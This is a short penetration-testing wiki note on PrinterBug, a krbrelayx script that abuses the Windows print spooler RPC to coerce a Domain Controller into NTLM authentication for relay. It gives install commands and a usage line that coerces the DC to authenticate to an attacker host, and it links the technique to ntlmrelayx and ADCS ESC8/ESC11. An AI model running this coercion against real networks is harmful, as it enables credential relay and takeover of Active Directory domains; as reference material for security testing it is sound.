# PrinterBug

**Tags:** `#printerbug` `#ntlmcoercion` `#msrprn` `#relay` `#activedirectory` `#lateralmovement`

Python script (`printerbug.py`, from dirkjanm's krbrelayx toolkit) that abuses MS-RPRN (the Print System Remote Protocol) to coerce a Windows host — typically a Domain Controller with the Spooler service running — into authenticating to an attacker-controlled machine. Requires valid domain credentials (unlike PetitPotam's unauthenticated variant on unpatched targets). Same use case as [[Tools/Lateral Movement/PetitPotam|PetitPotam]]: trigger coerced NTLM auth, then catch/relay it with [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]]. [[Tools/Lateral Movement/Coercer|Coercer]] is the maintained, multi-protocol successor that includes this technique alongside several others.

**Source:** https://github.com/dirkjanm/krbrelayx (`printerbug.py`)
**Install:**
```bash
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx && pip install -r requirements.txt
```

```bash
# Coerce the DC to authenticate to the attacker host
python3 printerbug.py <domain>/<user>:<pass>@<dc_ip> <attacker_ip>
```

> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] ESC8 and ESC11 attack vectors, which use this to trigger the coerced NTLM auth that gets relayed to the CA.

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
